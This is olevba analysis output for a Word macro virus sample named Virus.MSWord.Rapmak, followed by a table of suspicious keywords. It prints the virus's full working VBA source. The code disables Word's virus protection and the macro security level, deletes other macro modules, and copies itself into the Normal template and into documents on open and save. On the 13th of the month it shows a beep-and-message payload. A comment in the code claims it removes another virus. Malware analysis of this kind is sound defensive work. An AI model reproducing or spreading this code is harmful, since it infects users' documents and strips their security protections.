olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Rapmak-53d3904e5170ed5234045e352e4f7f625be3e26d
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Rapmak-53d3904e5170ed5234045e352e4f7f625be3e26d - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO DPMmay2000.bas 
in file: Virus.MSWord.Rapmak-53d3904e5170ed5234045e352e4f7f625be3e26d - OLE stream: 'Macros/VBA/DPMmay2000'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub ToolsMacro()
'Create by Yean Sin from DPM May 2000 TARC(Kampar, Perak)
'The purpose is to delete another virus on the computer lab
End Sub
Sub ViewVBCode()
End Sub
Sub FileTemplates()
End Sub
Sub DisPrompt()
    Options.SaveNormalPrompt = False
    Options.SavePropertiesPrompt = False
    Options.VirusProtection = False
End Sub
Sub ToolsOptions()
On Error GoTo StopExit
    Options.SaveNormalPrompt = True
    Options.SavePropertiesPrompt = True
    Options.VirusProtection = True
    Dialogs(wdDialogToolsOptions).Show
    DisPrompt
StopExit:
End Sub
Sub InfactAc()
On Error GoTo StopExit
    Dim AcInfacted As Boolean
    AcInfacted = False
    For Each Obj In ActiveDocument.VBProject.VBComponents
        If Obj.Name = "DPMmay2000" Then AcInfacted = True
        If Obj.Name <> "DPMmay2000" And Obj.Name <> "ThisDocument" Then
            Application.OrganizerDelete Source:=ActiveDocument.FullName, _
            Name:=Obj.Name, Object:=wdOrganizerObjectProjectItems
        End If
    Next Obj
    Nor = NormalTemplate.FullName & "CCIP/DPM"
    Ac = ActiveDocument.FullName & "CCIP/DPM"
    If AcInfacted = False Then
        Application.OrganizerCopy Source:=Left(Nor, Len(Nor) - 8), _
        Destination:=Left(Ac, Len(Ac) - 8), Name:="DPMmay2000", _
        Object:=wdOrganizerObjectProjectItems
        ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
    End If
StopExit:
End Sub
Sub InfactNor()
On Error GoTo StopExit
    Dim NorInfacted As Boolean
    NorInfacted = False
    For Each Obj In NormalTemplate.VBProject.VBComponents
        If Obj.Name = "DPMmay2000" Then NorInfacted = True
        If Obj.Name <> "DPMmay2000" And Obj.Name <> "ThisDocument" Then
            Application.OrganizerDelete Source:=NormalTemplate.FullName, _
            Name:=Obj.Name, Object:=wdOrganizerObjectProjectItems
        End If
    Next Obj
    If NorInfacted = False Then
        Application.OrganizerCopy Source:=ActiveDocument.FullName, _
        Destination:=NormalTemplate.FullName, Name:="DPMmay2000", Object:=wdOrganizerObjectProjectItems
        NormalTemplate.Save
    End If
StopExit:
End Sub
Sub Clear97()
On Error Resume Next
If System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security", "Level") <> "" Then
  CommandBars("Macro").Controls("Security...").Enabled = False
  System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security", "Level") = 1&
Else
  CommandBars("Tools").Controls("Macro").Enabled = False
  Options.ConfirmConversions = (5 - 5): Options.VirusProtection = (3 - 3): Options.SaveNormalPrompt = (2 - 2)
End If
Set AcDoc = ActiveDocument.VBProject.VBComponents.Item(1)
Set NorDoc = NormalTemplate.VBProject.VBComponents.Item(1)
AcDocLine = AcDoc.CodeModule.CountOfLines
NorDocLine = NorDoc.CodeModule.CountOfLines
If AcDocLine <> 0 Then
    AcDoc.CodeModule.deleteLines 1, AcDocLine
End If
If NorDocLine <> 0 Then
    NorDoc.CodeModule.deleteLines 1, NorDocLine
End If
End Sub
Sub Inf()
    InfactNor
    InfactAc
    Clear97
End Sub
Sub FileOpen()
On Error Resume Next
    WordBasic.DisableAutoMacros True
    If Dialogs(wdDialogFileOpen).Show <> 0 Then
        Inf
    End If
    WordBasic.DisableAutoMacros False
End Sub
Sub AutoOpen()
On Error Resume Next
    DisPrompt
    Inf
End Sub
Sub AutoClose()
    DisplayMsg
End Sub
Sub DisplayMsg()
On Error GoTo StopExit
If Day(Date) = 13 Then
    For i = 0 To 1300
        Beep
    Next
    MsgBox "                We have finished DPM course in 2001 with" & vbCrLf & _
           "             the help of all CCIP and DPM course Lacturers," & vbCrLf & _
           "         we would like to express our highest gratitude to them." & vbCrLf & _
           "Their concerted dedication toward our study is highly appreciated. ", , "DPM may 2000"
End If
StopExit:
End Sub
Sub FileSave()
On Error Resume Next
    ActiveDocument.Save
    InfactAc
    DisplayMsg
End Sub

+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|Create              |May execute file or a system command through |
|          |                    |WMI                                          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

